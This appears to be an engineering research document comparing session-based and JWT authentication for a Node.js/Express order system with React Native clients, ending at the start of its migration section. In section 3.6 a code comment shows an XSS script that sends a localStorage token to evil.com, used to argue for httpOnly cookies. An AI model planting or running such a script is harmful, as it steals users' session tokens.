# Authentication Deep Dive: Session-Based vs JWT for DZZLO-OMS

> Research document for making an informed auth architecture decision.
> Context: Node.js / Express 4.x / MongoDB Atlas / 2 EC2 behind ALB / React Native + Web clients

---

## Table of Contents

1. [Current State Analysis](#1-current-state-analysis)
2. [JWT vs Session Comparison Table](#2-jwt-vs-session-comparison-table)
3. [Why Sessions Can Be Better Than JWT](#3-why-sessions-can-be-better-than-jwt)
4. [Why JWT Can Be Better Than Sessions](#4-why-jwt-can-be-better-than-sessions)
5. [Session-Based Auth at Scale with Node.js/Express](#5-session-based-auth-at-scale-with-nodejsexpress)
6. [Hybrid Approach: Short-Lived JWT + Refresh Tokens](#6-hybrid-approach-short-lived-jwt--refresh-tokens)
7. [Session Auth with Mobile Apps (React Native)](#7-session-auth-with-mobile-apps-react-native)
8. [Session Auth with Multiple Servers Behind ALB](#8-session-auth-with-multiple-servers-behind-alb)
9. [Migration Path from JWT to Sessions or Hybrid](#9-migration-path-from-jwt-to-sessions-or-hybrid)
10. [Session Security Best Practices](#10-session-security-best-practices)
11. [Performance Comparison at Scale](#11-performance-comparison-at-scale)
12. [Recommendation for DZZLO-OMS](#12-recommendation-for-dzzlo-oms)

---

## 1. Current State Analysis

### What DZZLO-OMS does today

```
helpers/auth.js        -- getUserFromToken(), protect, authorize, scope
models/users.js        -- getSignedJwtToken() method on UserSchema
helpers/middlewares.js  -- logging() calls getUserFromToken() on EVERY request
```

**Current JWT flow:**

```
Login  -->  jwt.sign({ id, email, username, co_id, role }, JWT_SECRET, { expiresIn: JWT_EXPIRE })
                                                                         ^^^^^^^^^^^^^^^^^^^^
                                                                         Likely 30 days (from context)
Request -->  Bearer token in Authorization header
         -->  jwt.verify(token, JWT_SECRET)
         -->  User.findOne({ _id: jwtData.id }).lean()   <-- DB lookup on EVERY request
```

### Critical observations from code review

1. **You already hit the DB on every request.** `getUserFromToken()` does `jwt.verify()` then `User.findOne()`. This means you get ZERO benefit from JWT's "stateless" nature. You already pay the DB cost. JWT is purely a transport token here.
2. `**getUserFromToken()` is called TWICE per request.** Once in the `logging()` middleware (line 123 of middlewares.js) and presumably again in the `protect` middleware. That is two DB queries per request for the same user.
3. **No token revocation.** If you set a user's status to "REMOVED" in the `companies` array, `check_user_company_status` catches it, but only if that middleware runs. The JWT itself is still valid for up to 30 days.
4. **JWT payload has stale data.** If a user's role or scope changes, their JWT still carries the old values until they re-login or the token expires.
5. `**protect` middleware references `loggedInUser` but it is never defined in that function.** This appears to be a bug -- it should be calling `getUserFromToken(req.headers)` and assigning the result. The variable `loggedInUser` is undeclared in that scope.

### The uncomfortable truth

Your current architecture is **"JWT as a session ID with extra steps."** You verify the JWT, then immediately look up the user in the database. You could replace the JWT with a random session ID and the behavior would be identical, but with these improvements:

- Immediate revocation (delete the session)
- No stale payload data (always read from DB)
- Smaller token over the wire (~32 bytes vs ~400 bytes)
- No cryptographic verification overhead (though this is negligible)

---

## 2. JWT vs Session Comparison Table


| Dimension                   | JWT (Current)                                              | Server-Side Sessions                                     | Hybrid (JWT Access + Refresh)                             |
| --------------------------- | ---------------------------------------------------------- | -------------------------------------------------------- | --------------------------------------------------------- |
| **Stateless?**              | In theory yes, in DZZLO practice NO (DB hit every request) | No (session store required)                              | Access token stateless, refresh token stateful            |
| **Token size**              | ~400-800 bytes (grows with payload)                        | ~32 bytes (session ID)                                   | ~400 bytes access + ~64 bytes refresh                     |
| **Revocation**              | IMPOSSIBLE without blacklist/DB check                      | INSTANT (delete session row)                             | Access: wait for expiry (15 min). Refresh: instant revoke |
| **Stale data**              | Yes, until token expires                                   | Never (always read from store/DB)                        | Stale for access token lifetime only                      |
| **Storage (client)**        | localStorage/AsyncStorage/memory                           | Cookie (httpOnly)                                        | Access in memory, refresh in httpOnly cookie              |
| **Storage (server)**        | None (or blacklist table)                                  | Session store (MongoDB/Redis)                            | Refresh token table in DB                                 |
| **XSS vulnerability**       | HIGH if in localStorage                                    | LOW with httpOnly cookies                                | MEDIUM (access in memory is safe, but refresh in cookie)  |
| **CSRF vulnerability**      | NONE (Bearer header)                                       | YES (needs CSRF token)                                   | MIXED (depends on transport)                              |
| **Mobile compatibility**    | Excellent (easy header attach)                             | Requires cookie management                               | Good (access as header, refresh as cookie)                |
| **Multi-server**            | Works out of box                                           | Needs shared store (Redis/MongoDB)                       | Access works anywhere, refresh needs DB                   |
| **Performance per request** | jwt.verify() = ~0.5ms + your DB lookup                     | Session store lookup = 1-5ms (Redis) or 5-20ms (MongoDB) | jwt.verify() = ~0.5ms (no DB lookup!)                     |
| **Microservice friendly**   | Excellent (self-contained)                                 | Poor (each service needs session store access)           | Access token excellent for inter-service                  |
| **Logout**                  | Can't truly logout                                         | True logout                                              | True logout (revoke refresh)                              |
| **Token theft impact**      | Attacker has access for 30 DAYS                            | Attacker has access until session expires/is killed      | Attacker has access for 15 MINUTES max                    |
| **Complexity**              | Low                                                        | Low-Medium                                               | Medium-High                                               |
| **Horizontal scaling**      | Trivial                                                    | Needs shared session store                               | Moderate                                                  |


### For DZZLO-OMS specifically:


| Factor                                  | Assessment                                                                 |
| --------------------------------------- | -------------------------------------------------------------------------- |
| Scale (130 orders/day, ~120 businesses) | Small. Any approach works.                                                 |
| 2 EC2 behind ALB                        | Sessions need shared store OR sticky sessions. JWT/Hybrid work out of box. |
| React Native mobile app                 | All approaches work. JWT/Hybrid slightly easier.                           |
| No Redis                                | Sessions with MongoDB work fine at your scale. Redis not needed.           |
| Employee termination concern            | Sessions or Hybrid solve this. Pure JWT does not.                          |
| Current DB-hit-per-request pattern      | You already pay session-like costs.                                        |


---

## 3. Why Sessions Can Be Better Than JWT

### 3.1 Immediate revocation -- the killer feature

This is your stated problem. A fired employee keeps their 30-day JWT.

```js
// With sessions: instant kill
// When HR marks user as REMOVED:
await sessionStore.destroy(userSessionId);
// Or destroy ALL sessions for that user:
await db.collection('sessions').deleteMany({ 'session.userId': firedUserId });
// Done. Next request fails. No waiting 30 days.
```

```js
// With JWT: you CANNOT do this without one of:
// 1. A blacklist table (checked every request) -- which is just a session store with extra steps
// 2. Changing the JWT_SECRET (logs out EVERYONE)
// 3. Waiting for expiry
```

### 3.2 No stale data

JWTs carry a snapshot of the user at login time. If you change a user's role from "COrder" to "CAdmin", their JWT still says "COrder" until they re-login.

With sessions, every request reads from the session store (or DB). The data is always current.

In DZZLO-OMS, you already work around this by doing `User.findOne()` on every request. But then why carry the stale data in the JWT at all?

### 3.3 Smaller payload over the wire

```
JWT:     eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY1YTEyMzQ1Njc4O...  (~400-800 bytes)
Session: s:abc123def456.signature  (~80 bytes in cookie)
```

On mobile networks (where your React Native app runs), every byte matters. A session cookie is 5-10x smaller than a JWT.

### 3.4 Server-side control

With sessions, the server is the single source of truth:

- Force logout all devices: delete all sessions for a user
- Force logout one device: delete one session
- See active sessions: query the session store
- Limit concurrent sessions: count active sessions per user
- Extend/shorten session lifetime: modify server-side

With JWT, the token is out there in the wild. You have no control over it once issued.

### 3.5 Simpler mental model

Sessions are simple: "The server remembers who you are." No cryptography concepts, no access/refresh dance, no token rotation. Developers who work on this after you will understand it faster.

### 3.6 httpOnly cookies eliminate XSS token theft

```js
// JWT in localStorage -- XSS can steal it:
// <script>fetch('https://evil.com?token=' + localStorage.getItem('token'))</script>

// Session cookie with httpOnly -- XSS CANNOT read it:
// The cookie is invisible to JavaScript entirely
// It is sent automatically by the browser on every request
```

This is one of the strongest security arguments for sessions.

---

## 4. Why JWT Can Be Better Than Sessions

### 4.1 True statelessness (when done right)

If you do NOT hit the database on every request (unlike DZZLO-OMS currently), JWT is genuinely stateless:

```js
// Pure stateless JWT (NOT what DZZLO does currently):
const decoded = jwt.verify(token, secret);
req.user = decoded; // Trust the token payload, no DB lookup
next();
```

This means:

- No session store to maintain
- No session store to scale
- No session store as a single point of failure
- Each server is completely independent

**However:** DZZLO-OMS does NOT use JWT this way. You do a DB lookup every time. So you get none of these benefits currently.

### 4.2 No server-side storage required

At 120 businesses with maybe 500-1000 concurrent users, session storage is trivial. But at scale (millions of users), session stores become expensive infrastructure.

**For DZZLO-OMS:** Not relevant. Your scale does not stress any session store.

### 4.3 Mobile-friendly transport

```js
// React Native with JWT -- clean and simple:
const response = await fetch(url, {
  headers: {
    'Authorization': `Bearer ${token}`,
    'x-api-key': API_KEY,
  }
});
```

No cookie management, no cookie jar libraries, no concerns about cookie domain configuration. JWT in a header "just works" on mobile.

Sessions with cookies on React Native are possible but require more configuration (covered in Section 7).

### 4.4 Microservice-friendly

If DZZLO-OMS ever splits into microservices, JWT access tokens can be verified by any service independently:

```
Client --> API Gateway --> Order Service (verifies JWT locally)
                       --> Payment Service (verifies JWT locally)
                       --> Invoice Service (verifies JWT locally)
```

No service needs to talk to a central session store. Each one has the JWT_SECRET and can verify independently.

**For DZZLO-OMS:** You are a monolith with two instances behind ALB. Not relevant today, but could matter if you move to microservices.

### 4.5 Works across servers without shared state

With 2 EC2 instances behind ALB, JWT works without any session synchronization:

```
Request 1 --> EC2-A (verifies JWT locally) -- works
Request 2 --> EC2-B (verifies JWT locally) -- works
```

Sessions require either:

- Sticky sessions on ALB (ties user to one server)
- Shared session store (MongoDB/Redis accessible by both servers)

### 4.6 Third-party and cross-domain scenarios

If external partners ever need to call DZZLO-OMS APIs, JWT in headers is the standard. Session cookies are bound to your domain and do not work well for API consumers outside your origin.

---

## 5. Session-Based Auth at Scale with Node.js/Express

### 5.1 express-session + connect-mongo (MongoDB session store)

This is the most natural choice for DZZLO-OMS since you already use MongoDB Atlas.

**Packages:**

```
express-session   ^1.18.0  (latest stable)
connect-mongo     ^5.1.0   (latest, supports MongoDB driver 6.x)
```

**Setup code:**

```js
// In dzzlo_oms.js, after mongoose connection is confirmed:
const session = require('express-session');
const MongoStore = require('connect-mongo');

app.use(session({
  secret: process.env.SESSION_SECRET,           // Use a strong random string, NOT JWT_SECRET
  resave: false,                                 // Don't save session if unmodified
  saveUninitialized: false,                      // Don't create session until something stored
  name: 'dzzlo.sid',                             // Custom cookie name (not 'connect.sid')
  store: MongoStore.create({
    mongoUrl: process.env.DATABASE_URI,          // Your existing MongoDB Atlas URI
    dbName: 'dzzlo_sessions',                    // Separate DB or same DB, your choice
    collectionName: 'sessions',
    ttl: 7 * 24 * 60 * 60,                      // 7 days (in seconds)
    autoRemove: 'native',                        // Use MongoDB TTL index for cleanup
    touchAfter: 24 * 3600,                       // Lazy update: only update session once per day
                                                 // unless data changes. Reduces DB writes.
    crypto: {
      secret: process.env.SESSION_STORE_SECRET,  // Encrypt session data at rest
    },
  }),
  cookie: {
    secure: process.env.NODE_ENV === 'production',  // HTTPS only in production
    httpOnly: true,                                  // Not accessible via JavaScript
    sameSite: 'lax',                                 // CSRF protection
    maxAge: 7 * 24 * 60 * 60 * 1000,               // 7 days in milliseconds
    domain: '.dzzlo.com',                            // Shared across subdomains if needed
  },
}));
```

**Login handler:**

```js
exports.login = asyncHandler(async (req, res, next) => {
  const { email, password } = req.body;
  const user = await User.findOne({ email }).select('+password');

  if (!user || !(await user.matchPassword(password))) {
    return next(new ErrorResponse('Invalid credentials', 401));
  }

  // Store user data in session
  req.session.userId = user._id;
  req.session.role = user.role;
  req.session.co_id = user.co_id;

  // Session is automatically saved to MongoDB, cookie sent in response

  res.status(200).json({
    success: true,
    data: {
      id: user._id,
      username: user.username,
      email: user.email,
      role: user.role,
    },
  });
});
```

**Protect middleware (session version):**

```js
exports.protect = asyncHandler(async (req, res, next) => {
  if (!req.session || !req.session.userId) {
    return next(new ErrorResponse('Not authorized. Please login.', 401));
  }

  // Fetch fresh user data (you already do this with JWT, so no extra cost)
  const user = await User.findById(req.session.userId)
    .select('-resetPasswordToken -resetPasswordExpire -OTP_Value -OTP_Expire -__v')
    .lean();

  if (!user) {
    req.session.destroy();
    return next(new ErrorResponse('User not found. Please login again.', 401));
  }

  req.user = user;
  next();
});
```

**Logout (the feature you can't do today):**

```js
exports.logout = asyncHandler(async (req, res, next) => {
  req.session.destroy((err) => {
    if (err) return next(new ErrorResponse('Logout failed', 500));
    res.clearCookie('dzzlo.sid');
    res.status(200).json({ success: true, message: 'Logged out' });
  });
});
```

**Force-logout a user (admin action -- the fired employee scenario):**

```js
exports.forceLogoutUser = asyncHandler(async (req, res, next) => {
  const { userId } = req.params;

  // Delete ALL sessions for this user from MongoDB
  const sessionCollection = mongoose.connection.db.collection('sessions');
  const result = await sessionCollection.deleteMany({
    // connect-mongo stores session data as JSON string
    session: { $regex: `"userId":"${userId}"` }
  });

  // Better approach: add a 'userId' field to session for indexing
  // (See Section 5.3 for indexed approach)

  res.status(200).json({
    success: true,
    message: `Destroyed ${result.deletedCount} sessions for user ${userId}`,
  });
});
```

### 5.2 express-session + connect-redis (Redis session store)

You said you have no Redis currently. Here is why you would add it and when you would NOT.

**When to use Redis for sessions:**

- Thousands of concurrent sessions (not your case)
- Sub-millisecond session lookup required (not your case)
- Already have Redis for caching (you do not)
- Session data changes frequently (the `touchAfter` option in connect-mongo mitigates this)

**When MongoDB is fine for sessions:**

- < 10,000 concurrent sessions (your case: maybe 200-500)
- Session lookup latency of 5-20ms is acceptable (it is -- you already accept 5-20ms for `User.findOne()`)
- You want fewer infrastructure components (one DB, not two)
- MongoDB Atlas already provides high availability

**For reference, here is the Redis setup you would NOT need right now:**

```js
// DO NOT ADD THIS unless you outgrow MongoDB sessions
const RedisStore = require('connect-redis').default;
const { createClient } = require('redis');

const redisClient = createClient({ url: process.env.REDIS_URL });
redisClient.connect();

app.use(session({
  store: new RedisStore({ client: redisClient }),
  // ... same options as above
}));
```

**Packages (if ever needed):**

```
connect-redis  ^7.1.0
redis          ^4.6.0  (or ioredis ^5.3.0)
```

### 5.3 Session store comparison for DZZLO-OMS


| Factor                          | MongoDB (connect-mongo) | Redis (connect-redis)   | DynamoDB                    |
| ------------------------------- | ----------------------- | ----------------------- | --------------------------- |
| **You already have it**         | YES (Atlas)             | No                      | No (AWS, but extra service) |
| **Latency**                     | 5-20ms                  | 0.5-2ms                 | 5-10ms                      |
| **Cost**                        | $0 (existing Atlas)     | $15-50/mo (ElastiCache) | Pay per request             |
| **Persistence**                 | Built-in                | Requires AOF/RDB config | Built-in                    |
| **TTL auto-cleanup**            | Native TTL index        | Native EXPIRE           | Native TTL                  |
| **Ops burden**                  | None (managed Atlas)    | New service to manage   | Low (managed)               |
| **Good enough for your scale?** | Absolutely              | Overkill                | Overkill                    |
| **Express integration**         | connect-mongo ^5.1      | connect-redis ^7.1      | dynamodb-store              |


**Verdict for DZZLO-OMS:** Use MongoDB. You already have Atlas. At 130 orders/day, MongoDB session lookups are a rounding error. Add Redis only when (if ever) you have > 5,000 concurrent users or need < 2ms session lookups.

### 5.4 How ALB handles sessions

**Option A: Shared session store (RECOMMENDED)**

```
                    +-----------+
 Client  -------->  |   ALB     |  (round-robin, no sticky)
                    +-----------+
                    /             \
              +--------+     +--------+
              | EC2-A  |     | EC2-B  |
              +--------+     +--------+
                    \             /
                    +-----------+
                    | MongoDB   |  <-- sessions collection
                    | Atlas     |
                    +-----------+
```

Both EC2 instances read/write sessions from the same MongoDB. ALB uses round-robin. Any request can go to any server. This is what `connect-mongo` gives you out of the box.

**Option B: ALB Sticky Sessions (NOT RECOMMENDED)**

```
ALB sticky sessions (AWSALB cookie) pin a user to one EC2 instance.

Problems:
- If EC2-A dies, all users pinned to it lose their sessions
- Uneven load distribution
- Defeats the purpose of load balancing
- You still need a session store for persistence (so why bother with sticky?)
```

**Go with Option A.** connect-mongo with your existing Atlas cluster. Zero additional infrastructure.

---

## 6. Hybrid Approach: Short-Lived JWT + Refresh Tokens

This is the "best of both worlds" approach used by Auth0, Firebase, AWS Cognito, and most modern auth systems.

### 6.1 How it works

```
LOGIN:
  1. Validate credentials
  2. Issue ACCESS TOKEN (JWT, 15 min expiry, contains user claims)
  3. Issue REFRESH TOKEN (opaque random string, 7-30 day expiry, stored in DB)
  4. Return access token in response body, refresh token in httpOnly cookie

API REQUEST:
  1. Client sends: Authorization: Bearer <access_token>
  2. Server does: jwt.verify(token, secret)
  3. NO database lookup needed (trust the token for 15 minutes)
  4. This is TRUE stateless auth

ACCESS TOKEN EXPIRES:
  1. Client gets 401 from API
  2. Client calls POST /auth/refresh (refresh token sent automatically via cookie)
  3. Server validates refresh token against DB
  4. Server issues new access token + optionally rotates refresh token
  5. Client retries original request with new access token

REVOCATION (fired employee):
  1. Admin deletes user's refresh tokens from DB
  2. Current access token still works... but only for max 15 more minutes
  3. When it expires, refresh fails, user is locked out
  4. If 15 min is too long, add a lightweight "revoked users" check
```

### 6.2 Implementation for DZZLO-OMS

**New model: RefreshToken**

```js
// models/refresh_tokens.js
const mongoose = require('mongoose');
const crypto = require('crypto');

const RefreshTokenSchema = new mongoose.Schema({
  token: {
    type: String,
    required: true,
    unique: true,
    index: true,
  },
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'users',
    required: true,
    index: true,
  },
  deviceInfo: {
    type: String,       // e.g., "iPhone 14 / iOS 17" or "Chrome 120 / Windows"
    default: '',
  },
  expiresAt: {
    type: Date,
    required: true,
    index: { expires: 0 },  // MongoDB TTL: auto-delete when expired
  },
  createdAt: {
    type: Date,
    default: Date.now,
  },
  // Family ID for rotation detection (optional, advanced)
  family: {
    type: String,
    default: () => crypto.randomBytes(16).toString('hex'),
  },
  replacedBy: {
    type: String,
    default: null,
  },
});

// Static: create a new refresh token
RefreshTokenSchema.statics.createToken = async function(userId, deviceInfo = '') {
  const token = crypto.randomBytes(40).toString('hex');
  const expiresAt = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000); // 30 days

  const refreshToken = await this.create({
    token,
    userId,
    deviceInfo,
    expiresAt,
  });

  return refreshToken;
};

// Static: revoke all tokens for a user (fired employee scenario)
RefreshTokenSchema.statics.revokeAllForUser = async function(userId) {
  return this.deleteMany({ userId });
};

module.exports = mongoose.model('refresh_tokens', RefreshTokenSchema);
```

**Updated login handler:**

```js
const jwt = require('jsonwebtoken');
const RefreshToken = require('../models/refresh_tokens');

exports.login = asyncHandler(async (req, res, next) => {
  const { email, password } = req.body;
  const user = await User.findOne({ email }).select('+password');

  if (!user || !(await user.matchPassword(password))) {
    return next(new ErrorResponse('Invalid credentials', 401));
  }

  // 1. Create short-lived access token (15 minutes)
  const accessToken = jwt.sign(
    {
      id: user._id,
      email: user.email,
      username: user.username,
      co_id: user.co_id,
      role: user.role,
      scope: user.scope,
    },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );

  // 2. Create long-lived refresh token (stored in DB)
  const meta = req.headers.meta ? JSON.parse(req.headers.meta) : {};
  const deviceInfo = meta.deviceBrand
    ? `${meta.deviceBrand} / v${meta.version}`
    : req.get('User-Agent') || 'Unknown';

  const refreshToken = await RefreshToken.createToken(user._id, deviceInfo);

  // 3. Set refresh token as httpOnly cookie
  res.cookie('refreshToken', refreshToken.token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
    path: '/api/v3/auth',              // Only sent to auth endpoints
  });

  // 4. Return access token in body (client stores in memory)
  res.status(200).json({
    success: true,
    accessToken,
    expiresIn: 900, // 15 minutes in seconds (client uses this for refresh timer)
    data: {
      id: user._id,
      username: user.username,
      email: user.email,
      role: user.role,
    },
  });
});
```

**Refresh endpoint:**

```js
exports.refreshAccessToken = asyncHandler(async (req, res, next) => {
  const { refreshToken: tokenFromCookie } = req.cookies;
  // For mobile: also accept from body
  const token = tokenFromCookie || req.body.refreshToken;

  if (!token) {
    return next(new ErrorResponse('No refresh token provided', 401));
  }

  // 1. Find token in DB
  const storedToken = await RefreshToken.findOne({ token });

  if (!storedToken) {
    // Token not found -- possibly stolen and already rotated
    // Security: if token was part of a family, revoke entire family
    return next(new ErrorResponse('Invalid refresh token. Please login again.', 401));
  }

  // 2. Check expiry
  if (storedToken.expiresAt < new Date()) {
    await storedToken.deleteOne();
    return next(new ErrorResponse('Refresh token expired. Please login again.', 401));
  }

  // 3. Get fresh user data
  const user = await User.findById(storedToken.userId)
    .select('-resetPasswordToken -resetPasswordExpire -OTP_Value -OTP_Expire -__v -password');

  if (!user) {
    await RefreshToken.revokeAllForUser(storedToken.userId);
    return next(new ErrorResponse('User not found', 401));
  }

  // 4. Check user is still active
  const activeCompany = user.companies?.find(
    c => `${c.co_id}` === `${user.co_id}` && c.status === 'ACTIVE'
  );
  if (!activeCompany && user.role !== 'superadmin') {
    await RefreshToken.revokeAllForUser(user._id);
    return next(new ErrorResponse('Account deactivated. Contact your admin.', 403));
  }

  // 5. Rotate refresh token (optional but recommended)
  //    Delete old, create new
  const newRefreshToken = await RefreshToken.createToken(user._id, storedToken.deviceInfo);
  storedToken.replacedBy = newRefreshToken.token;
  await storedToken.deleteOne();

  // 6. Issue new access token
  const accessToken = jwt.sign(
    {
      id: user._id,
      email: user.email,
      username: user.username,
      co_id: user.co_id,
      role: user.role,
      scope: user.scope,
    },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );

  // 7. Set new refresh token cookie
  res.cookie('refreshToken', newRefreshToken.token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 30 * 24 * 60 * 60 * 1000,
    path: '/api/v3/auth',
  });

  res.status(200).json({
    success: true,
    accessToken,
    expiresIn: 900,
  });
});
```

**Updated protect middleware (truly stateless for access token):**

```js
exports.protect = asyncHandler(async (req, res, next) => {
  const authHeader = req.headers.authorization || '';
  const token = authHeader.startsWith('Bearer') ? authHeader.split('Bearer ')[1] : '';

  if (!token) {
    return next(new ErrorResponse('Not authorized. Please login.', 401));
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;  // Trust the token! No DB lookup needed!
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return next(new ErrorResponse('Token expired. Please refresh.', 401));
    }
    return next(new ErrorResponse('Invalid token. Please login.', 401));
  }
});
```

**Force-logout (fired employee):**

```js
exports.revokeUserAccess = asyncHandler(async (req, res, next) => {
  const { userId } = req.params;

  // Delete all refresh tokens -- user can't get new access tokens
  const result = await RefreshToken.revokeAllForUser(userId);

  // Optionally: also update user status in DB
  await User.findByIdAndUpdate(userId, {
    $set: { 'companies.$[].status': 'REMOVED' }
  });

  res.status(200).json({
    success: true,
    message: `Revoked ${result.deletedCount} refresh tokens. User locked out within 15 minutes.`,
  });
});
```

### 6.3 Client-side implementation (React Native)

```js
// auth.js (React Native)

let accessToken = null;  // In-memory only -- lost on app restart (good!)
let refreshTimer = null;

// Store refresh token securely on mobile
import * as SecureStore from 'expo-secure-store'; // or react-native-keychain

async function login(email, password) {
  const response = await fetch(`${API_URL}/api/v3/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
    body: JSON.stringify({ email, password }),
    credentials: 'include',  // Important: sends/receives cookies
  });

  const data = await response.json();
  if (data.success) {
    accessToken = data.accessToken;

    // For mobile: also store refresh token in secure storage
    // (cookies may not persist reliably on all RN setups)
    if (data.refreshToken) {
      await SecureStore.setItemAsync('refreshToken', data.refreshToken);
    }

    // Schedule refresh 1 minute before expiry
    scheduleRefresh(data.expiresIn);
  }
  return data;
}

function scheduleRefresh(expiresInSeconds) {
  if (refreshTimer) clearTimeout(refreshTimer);
  // Refresh 60 seconds before expiry
  const refreshIn = (expiresInSeconds - 60) * 1000;
  refreshTimer = setTimeout(refreshAccessToken, refreshIn);
}

async function refreshAccessToken() {
  // Try cookie first (web), then secure storage (mobile)
  const storedRefreshToken = await SecureStore.getItemAsync('refreshToken');

  const response = await fetch(`${API_URL}/api/v3/auth/refresh`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
    body: JSON.stringify({ refreshToken: storedRefreshToken }),
    credentials: 'include',
  });

  const data = await response.json();
  if (data.success) {
    accessToken = data.accessToken;
    scheduleRefresh(data.expiresIn);
  } else {
    // Refresh failed -- force re-login
    accessToken = null;
    await SecureStore.deleteItemAsync('refreshToken');
    // Navigate to login screen
  }
}

// Interceptor: attach access token to every API call
async function apiCall(url, options = {}) {
  const headers = {
    ...options.headers,
    'Authorization': `Bearer ${accessToken}`,
    'x-api-key': API_KEY,
  };

  let response = await fetch(url, { ...options, headers });

  // If 401, try refresh and retry once
  if (response.status === 401) {
    await refreshAccessToken();
    if (accessToken) {
      headers['Authorization'] = `Bearer ${accessToken}`;
      response = await fetch(url, { ...options, headers });
    }
  }

  return response;
}
```

### 6.4 Hybrid approach -- the complete picture

```
                        ACCESS TOKEN (15 min)                REFRESH TOKEN (30 days)
                        =====================                =======================
 Where created:         Server (jwt.sign)                    Server (crypto.randomBytes)
 Where stored (web):    JavaScript memory                    httpOnly cookie
 Where stored (mobile): JavaScript memory                    Secure Keychain / SecureStore
 Where stored (server): Nowhere                              MongoDB 'refresh_tokens' collection
 Sent via:              Authorization: Bearer header         Cookie (auto) or POST body (mobile)
 Validated by:          jwt.verify() -- no DB                DB lookup of token
 If stolen:             Attacker has 15 min                  Attacker has until rotation
 Revocation:            Wait for expiry (15 min)             Delete from DB = instant
 DB queries per request: 0                                   1 (only on refresh, every 15 min)
```

**Big win over current setup:** Your current system does `User.findOne()` on EVERY request. The hybrid approach does 0 DB queries for auth on regular requests and 1 DB query every 15 minutes on refresh. That is a significant reduction.

---

## 7. Session Auth with Mobile Apps (React Native)

### 7.1 The challenge

Sessions traditionally rely on cookies. Browsers handle cookies automatically. React Native does not.

### 7.2 Options for React Native

**Option A: Cookie-based (like a browser)**

React Native's `fetch` supports cookies when you set `credentials: 'include'`:

```js
// React Native
const response = await fetch('https://api.dzzlo.com/api/v3/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email, password }),
  credentials: 'include',  // This tells fetch to handle cookies
});

// Subsequent requests automatically include the session cookie
const orders = await fetch('https://api.dzzlo.com/api/v3/orders', {
  credentials: 'include',
});
```

**Gotchas:**

- Cookie persistence across app restarts is unreliable on some RN versions
- Android WebView and iOS WKWebView handle cookies differently
- Some React Native networking libraries (Axios) need extra config for cookies
- `@react-native-cookies/cookies` package can help manage cookie persistence

**Option B: Token-in-header (session ID as a custom header)**

Instead of relying on cookies, extract the session ID and send it as a header:

```js
// Server: Also return session ID in response body on login
res.json({ success: true, sessionId: req.sessionID, ... });

// Or: Use a custom header instead of cookie
// Server middleware to accept session ID from header:
app.use((req, res, next) => {
  if (!req.headers.cookie && req.headers['x-session-id']) {
    req.headers.cookie = `dzzlo.sid=${req.headers['x-session-id']}`;
  }
  next();
});
```

This effectively turns sessions into "token auth with server-side storage" -- which is fine.

**Option C: Hybrid approach (recommended for DZZLO-OMS)**

Use the JWT access + refresh token approach from Section 6. Mobile clients send JWT in the `Authorization` header (exactly like today), and the refresh token is stored in SecureStore. No cookie handling needed on mobile at all.

### 7.3 Secure storage on React Native

```
Package                        Platform     Storage Location
react-native-keychain          iOS/Android  iOS Keychain / Android Keystore
expo-secure-store              iOS/Android  iOS Keychain / Android EncryptedSharedPreferences
react-native-sensitive-info    iOS/Android  iOS Keychain / Android SharedPreferences (encrypted)
@react-native-async-storage    iOS/Android  NOT SECURE -- plain text. Use only for non-sensitive data.
```

**NEVER store tokens in AsyncStorage.** It is unencrypted plain text. Use `react-native-keychain` or `expo-secure-store` for refresh tokens.

```js
// Using react-native-keychain (recommended)
import * as Keychain from 'react-native-keychain';

// Store refresh token
await Keychain.setGenericPassword('refreshToken', token, {
  service: 'com.dzzlo.oms.auth',
  accessible: Keychain.ACCESSIBLE.WHEN_UNLOCKED,
});

// Retrieve refresh token
const credentials = await Keychain.getGenericPassword({
  service: 'com.dzzlo.oms.auth',
});
const refreshToken = credentials ? credentials.password : null;

// Delete on logout
await Keychain.resetGenericPassword({ service: 'com.dzzlo.oms.auth' });
```

---

## 8. Session Auth with Multiple Servers Behind ALB

### 8.1 The problem

```
Request 1 --> ALB --> EC2-A  (creates session, stores in EC2-A memory)
Request 2 --> ALB --> EC2-B  (session not found! User appears logged out!)
```

### 8.2 Solution: Shared session store (connect-mongo)

When using `connect-mongo`, sessions are stored in MongoDB, not in server memory. Both EC2 instances read from the same MongoDB:

```
Request 1 --> ALB --> EC2-A --> MongoDB Atlas (creates session)
Request 2 --> ALB --> EC2-B --> MongoDB Atlas (finds session)
                                    WORKS!
```

**No configuration changes needed on ALB.** Keep round-robin or least-connections routing. No sticky sessions required.

### 8.3 Solution comparison for multi-server sessions


| Approach                 | How it works                                      | Pros                                     | Cons                                                                  | For DZZLO?         |
| ------------------------ | ------------------------------------------------- | ---------------------------------------- | --------------------------------------------------------------------- | ------------------ |
| **Shared MongoDB store** | Both servers read/write sessions in MongoDB Atlas | Zero new infra, simple, reliable         | ~10ms per session lookup                                              | YES -- perfect fit |
| **Shared Redis store**   | Both servers read/write sessions in Redis         | ~1ms lookups, purpose-built for sessions | New infrastructure, new cost, new failure point                       | No -- overkill     |
| **ALB sticky sessions**  | AWSALB cookie pins user to one EC2                | No shared store needed                   | Uneven load, single point of failure, sessions lost on instance death | No                 |
| **Session replication**  | Servers sync sessions to each other               | No external store                        | Complex, brittle, doesn't scale beyond 2-3 nodes                      | No                 |
| **JWT (current)**        | No server-side state needed                       | Works everywhere                         | Can't revoke, stale data                                              | Current approach   |
| **Hybrid JWT**           | Access token stateless, refresh in DB             | Best of both worlds                      | More complex client logic                                             | RECOMMENDED        |


---

## 9. Migration Path from JWT to Sessions or Hybrid

### 9.1 Strategy: Dual-auth period

Do NOT switch all clients at once. Run both auth mechanisms in parallel:

```
